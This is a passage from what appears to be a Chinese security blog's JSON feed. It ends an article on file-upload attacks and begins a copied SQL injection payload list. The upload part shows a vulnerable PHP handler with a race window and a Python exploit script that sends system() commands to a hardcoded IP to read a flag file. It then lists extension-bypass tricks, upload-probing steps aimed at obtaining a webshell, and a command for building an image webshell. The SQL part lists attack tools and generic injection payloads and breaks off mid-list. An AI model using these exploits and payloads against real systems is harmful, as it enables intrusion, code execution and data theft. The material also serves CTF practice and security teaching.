variable\">$rootpath</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'uploads/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$time</span><span class=\"token operator\">.</span><span class=\"token variable\">$name1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tmpName</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$rootpath</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script language='JavaScript'>alert('文件移动失败!');window.location='index.php?page=submit'&lt;/script>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$type</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'image/jpeg'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>                    <span class=\"token variable\">$im</span> <span class=\"token operator\">=</span> @<span class=\"token function\">imagecreatefromjpeg</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$rootpath</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>                      <span class=\"token variable\">$im</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecreatetruecolor</span><span class=\"token punctuation\">(</span><span class=\"token number\">150</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>                      <span class=\"token variable\">$bg</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecolorallocate</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>                      <span class=\"token variable\">$text_color</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecolorallocate</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>                      <span class=\"token function\">imagefilledrectangle</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">150</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$bg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>                      <span class=\"token function\">imagestring</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"Error loading image\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$text_color</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>                        <span class=\"token variable\">$time</span><span class=\"token operator\">=</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>                        <span class=\"token variable\">$new_rootpath</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'uploads/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$time</span><span class=\"token operator\">.</span><span class=\"token variable\">$name1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>                        <span class=\"token function\">imagejpeg</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$new_rootpath</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>                <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$type</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'image/gif'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>                <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>                    <span class=\"token variable\">$im</span> <span class=\"token operator\">=</span> @<span class=\"token function\">imagecreatefromgif</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$rootpath</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>                    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>                      <span class=\"token variable\">$im</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecreatetruecolor</span><span class=\"token punctuation\">(</span><span class=\"token number\">150</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>                      <span class=\"token variable\">$bg</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecolorallocate</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>                      <span class=\"token variable\">$text_color</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecolorallocate</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>                      <span class=\"token function\">imagefilledrectangle</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">150</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$bg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>                      <span class=\"token function\">imagestring</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"Error loading image\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$text_color</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>                        <span class=\"token variable\">$time</span><span class=\"token operator\">=</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>                        <span class=\"token variable\">$new_rootpath</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'uploads/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$time</span><span class=\"token operator\">.</span><span class=\"token variable\">$name1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>                        <span class=\"token function\">imagegif</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$new_rootpath</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>                <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$rootpath</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"图片ID：\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$time</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> <span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"ERROR\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre> <span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>首先是验证上传的文件是否为图片格式，如果上传了正确的图片，imagecreatefromjpeg () 返回图像资源，文件名更换为新的时间戳，用新的文件路径 newrootpath 输 出 图 片 ， 最 后 删 除 原文件 unlink (new_rootpath) 输出图片，最后删除原文件 unlink; 如果上传了不正确的图片，不会更换新的文件路径，最后还要删除源文件 unlink ($rootpath); 上传过程中存在一个延时函数 sleep (5)，所以上传的文件即使验证不成功也有 5 秒钟的时间存在。</p>\n<p>python 的 payload。</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin\">id</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>s<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>data0<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'v'</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"phpinfo();\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>data1<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token string\">'v'</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"system('ls');\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>data2<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token string\">'v'</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"system('cat xxxxxxxxxasdasf_flag.php');\"</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token operator\">-</span><span class=\"token number\">50</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token operator\">+</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        url <span class=\"token operator\">=</span> <span class=\"token string\">'http://202.112.51.184:9005/index.php?page=phar://./uploads/'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'.jpg/v'</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        t<span class=\"token operator\">=</span>s<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>content</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">print</span> i</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">'flag'</span> <span class=\"token keyword\">in</span> t<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">print</span> t</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr></table></figure><h2 id=\"其它方式绕过\"><a class=\"anchor\" href=\"#其它方式绕过\">#</a> 其它方式 — 绕过</h2>\n<h3 id=\"原理-5\"><a class=\"anchor\" href=\"#原理-5\">#</a> 原理</h3>\n<p>部分程序员的思维不严谨，并使用逻辑不完善的上传文件合法性检测手段，导致可以找到方式绕过其检测方式。</p>\n<h3 id=\"绕过方法-8\"><a class=\"anchor\" href=\"#绕过方法-8\">#</a> 绕过方法</h3>\n<pre><code class=\"language-txt\">1. 后缀名大小写绕过 用于只将小写的脚本后缀名(如php)过滤掉的场合； \n例如:将Burpsuite截获的数据包中的文件名【evil.php】改为【evil.Php】\n\n2. 双写后缀名绕过 用于只将文件后缀名过滤掉的场合，例如&quot;php&quot;字符串过滤的； \n例如:上传时将Burpsuite截获的数据包中文件名【evil.php】改为【evil.pphphp】，那么过滤了第一个&quot;php&quot;字符串&quot;后，\n开头的’p’和结尾的’hp’就组合又形成了【php】。\n\n3. 特殊后缀名绕过 用于检测文件合法性的脚本有问题的场合； \n例如:将Burpsuite截获的数据包中【evil.php】名字改为【evil.php6】，或加个空格改为【evil.php 】等。\n</code></pre>\n<h1 id=\"常见web-server组合\"><a class=\"anchor\" href=\"#常见web-server组合\">#</a> 常见 web server 组合</h1>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>x.asp</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>windows server + asp + access  +  IIS</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>x.aspx</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>windows server + aspx + sql server  +  IIS</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>x.php</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Linux  + apache + php  + mysql </pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>linux +  ngix  + php  + mysql </pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>x.jsp  x.jspx</pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Linux + apache tomcat  + jsp +  mysql/sql server/oracle</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>windows server  + apache tomcat  + jsp +  mysql/sql server/oracle</pre></td></tr></table></figure><h1 id=\"文件上传检测流程\"><a class=\"anchor\" href=\"#文件上传检测流程\">#</a> 文件上传检测流程</h1>\n<h2 id=\"脑图-by-zksmile\"><a class=\"anchor\" href=\"#脑图-by-zksmile\">#</a> 脑图 【by zksmile】</h2>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<h2 id=\"流程\"><a class=\"anchor\" href=\"#流程\">#</a> 流程</h2>\n<ol>\n<li>\n<p>寻找上传点网站前台的上传点一般有头像上传、附件上传、证件认证上传。如果通过 SQL 注入或者其它一些技术手段得到网站后台权限，一般在网站更新页面的地方会存在上传点。也可以通过敏感目录或文件扫描工具扫到一些开源编辑器的测试上传页面等等。</p>\n</li>\n<li>\n<p>找到上传点之后，先上传一张正常的图片测试该上传点时候可用。</p>\n</li>\n<li>\n<p>上传一张正常的图片，抓包修改文件后缀名为对应网站脚本语言。<br />\n该操作可以绕过前端检测、MIME 检测、文件内容检测，可以检测出网站是否对上传文件进行了文件后缀名的检测。<br />\n如果上传成功表示没有对文件后缀进行检测，可以进一步上传图片马，抓包修改文件后缀为对应网站脚本语言即可获取 webshell.<br />\n 如果上传失败表示对文件名后缀进行了检测，需要进一步判断是黑名单检测还是白名单检测。</p>\n</li>\n<li>\n<p>上传一张正常的图片，在它后缀随便添加几个字符进行上传。<br />\neg: &quot;1jpgaaaaa&quot; 该后缀的文件既不在黑名单之内也不在白名单之内，如果文件上传成功代表是黑名单检测，如果上传失败代表是白名单检测。</p>\n</li>\n<li>\n<p>黑名单检测绕过</p>\n<ul>\n<li>文件名大小写绕过</li>\n<li>特殊文件名绕过<br />\n后缀加上：\n<ul>\n<li>::$DATA（目标环境在 Windows 下）</li>\n<li>空格和点 (.)，或空格和点的组合（目标环境在 Windows 下）<br />\n碰到过滤文件名的</li>\n<li>双写文件名 pphphp</li>\n</ul>\n</li>\n<li>0x00 截断绕过</li>\n<li>.htaccess 文件攻击</li>\n<li>php 文件包含漏洞</li>\n<li>Apache 解析漏洞</li>\n<li>Nginx 解析漏洞</li>\n</ul>\n</li>\n<li>\n<p>白名单检测绕过</p>\n<ul>\n<li>0x00 截断绕过</li>\n<li>是否暴露保存路径，保存路径截断，或修改</li>\n<li>php 文件包含漏洞</li>\n<li>IIS 解析漏洞</li>\n<li>Nginx 解析漏洞</li>\n</ul>\n</li>\n</ol>\n<p>图片马制作</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>copy <span class=\"token number\">1</span>.png/b + payload.* <span class=\"token number\">2</span>.png</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>/A           表示 ASCII 文本文件。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>/B           表示二进制文件。</pre></td></tr></table></figure>",
            "tags": [
                "文件上传"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/SQL-injection-payload-list/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/SQL-injection-payload-list/",
            "title": "SQL-injection-payload-list【转】",
            "date_published": "2020-12-30T09:38:30.000Z",
            "content_html": "<h1 id=\"sql-injection-payload-list\"><a class=\"anchor\" href=\"#sql-injection-payload-list\">#</a> SQL Injection Payload List</h1>\n<p>源地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3gvc3FsLWluamVjdGlvbi1wYXlsb2FkLWxpc3Q=\">https://github.com/payloadbox/sql-injection-payload-list</span></p>\n<h2 id=\"sql-injection\"><a class=\"anchor\" href=\"#sql-injection\">#</a> SQL Injection</h2>\n<p>In this section, we'll explain what SQL injection is, describe some common examples, explain how to find and exploit various kinds of SQL injection vulnerabilities, and summarize how to prevent SQL injection.</p>\n<h2 id=\"what-is-sql-injection-sqli\"><a class=\"anchor\" href=\"#what-is-sql-injection-sqli\">#</a> What is SQL injection (SQLi)?</h2>\n<p>SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.</p>\n<p>In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.</p>\n<table>\n<thead>\n<tr>\n<th>SQL Injection Type</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>In-band SQLi (Classic SQLi)</td>\n<td>In-band SQL Injection is the most common and easy-to-exploit of SQL Injection attacks. In-band SQL Injection occurs when an attacker is able to use the same communication channel to both launch the attack and gather results. The two most common types of in-band SQL Injection are Error-based SQLi and Union-based SQLi.</td>\n</tr>\n<tr>\n<td>Error-based SQLi</td>\n<td>Error-based SQLi is an in-band SQL Injection technique that relies on error messages thrown by the database server to obtain information about the structure of the database. In some cases, error-based SQL injection alone is enough for an attacker to enumerate an entire database.</td>\n</tr>\n<tr>\n<td>Union-based SQLi</td>\n<td>Union-based SQLi is an in-band SQL injection technique that leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response.</td>\n</tr>\n<tr>\n<td>Inferential SQLi (Blind SQLi)</td>\n<td>Inferential SQL Injection, unlike in-band SQLi, may take longer for an attacker to exploit, however, it is just as dangerous as any other form of SQL Injection. In an inferential SQLi attack, no data is actually transferred via the web application and the attacker would not be able to see the result of an attack in-band (which is why such attacks are commonly referred to as “blind SQL Injection attacks”). Instead, an attacker is able to reconstruct the database structure by sending payloads, observing the web application’s response and the resulting behavior of the database server. The two types of inferential SQL Injection are Blind-boolean-based SQLi and Blind-time-based SQLi.</td>\n</tr>\n<tr>\n<td>Boolean-based (content-based) Blind SQLi</td>\n<td>Boolean-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the application to return a different result depending on whether the query returns a TRUE or FALSE result. Depending on the result, the content within the HTTP response will change, or remain the same. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned.</td>\n</tr>\n<tr>\n<td>Time-based Blind SQLi</td>\n<td>Time-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the database to wait for a specified amount of time (in seconds) before responding. The response time will indicate to the attacker whether the result of the query is TRUE or FALSE. epending on the result, an HTTP response will be returned with a delay, or returned immediately. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned.</td>\n</tr>\n<tr>\n<td>Out-of-band SQLi</td>\n<td>Out-of-band SQL Injection is not very common, mostly because it depends on features being enabled on the database server being used by the web application. Out-of-band SQL Injection occurs when an attacker is unable to use the same channel to launch the attack and gather results. Out-of-band techniques, offer an attacker an alternative to inferential time-based techniques, especially if the server responses are not very stable (making an inferential time-based attack unreliable).</td>\n</tr>\n<tr>\n<td>Voice Based Sql Injection</td>\n<td>It is a sql injection attack method that can be applied in applications that provide access to databases with voice command. An attacker could pull information from the database by sending sql queries with sound.</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"sql-injection-vulnerability-scanner-tools\"><a class=\"anchor\" href=\"#sql-injection-vulnerability-scanner-tools\">#</a> SQL Injection Vulnerability Scanner Tool's :</h2>\n<ul>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NxbG1hcHByb2plY3Qvc3FsbWFw\">SQLMap</span> – Automatic SQL Injection And Database Takeover Tool</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JvbjE5MC9qc3FsLWluamVjdGlvbg==\">jSQL Injection</span> – Java Tool For Automatic SQL Database Injection</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL05lb2hhcHNpcy9iYnFzcWw=\">BBQSQL</span> – A Blind SQL-Injection Exploitation Tool</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NvZGluZ28vTm9TUUxNYXA=\">NoSQLMap</span> – Automated NoSQL Database Pwnage</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cua2l0cGxvaXQuY29tLzIwMTcvMDUvd2hpdGV3aWRvdy1zcWwtdnVsbmVyYWJpbGl0eS1zY2FubmVyLmh0bWw=\">Whitewidow</span> – SQL Vulnerability Scanner</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N0YW1wYXJtL0RTU1M=\">DSSS</span> – Damn Small SQLi Scanner</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2R0YWctZGV2LXNlYy9leHBsbw==\">explo</span> – Human And Machine Readable Web Vulnerability Testing Format</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2F3bnVtYXIvYmxpbmQtc3FsLWJpdHNoaWZ0aW5n\">Blind-Sql-Bitshifting</span> – Blind SQL-Injection via Bitshifting</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xldmlhdGhhbi1mcmFtZXdvcmsvbGV2aWF0aGFu\">Leviathan</span> – Wide Range Mass Audit Toolkit</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0pvaG5Ucm9vbnkvQmxpc3F5\">Blisqy</span> – Exploit Time-based blind-SQL-injection in HTTP-Headers (MySQL/MariaDB)</p>\n</li>\n</ul>\n<h2 id=\"generic-sql-injection-payloads\"><a class=\"anchor\" href=\"#generic-sql-injection-payloads\">#</a> Generic SQL Injection Payloads</h2>\n<pre><code>'\n''\n`\n``\n,\n&quot;\n&quot;&quot;\n/\n//\n\\\n\\\\\n;\n' or &quot;\n-- or # \n' OR '1\n' OR 1 -- -\n&quot; OR &quot;&quot; = &quot;\n&quot; OR 1 = 1 -- -\n' OR '' = '\n'='\n'LIKE'\n'=0--+\n OR 1=1\n' OR 'x'='x\n' AND id IS NULL; --\n'''''''''''''UNION SELECT '2\n%00\n/*…*/ \n+\t\taddition, concatenate (or space in url)\n||\t\t(double pipe) concatenate\n%\t\twildcard attribute indicator\n\n@variable\tlocal variable\n@@variable\tglobal variable\n\n\n# Numeric\nAND 1\nAND 0\nAND true\nAND false\n1-false\n1-true\n1*56\n-2\n\n\n1' ORDER BY 1--+\n1' ORDER BY 2--+\n1' ORDER BY 3--+\n\n1' ORDER BY 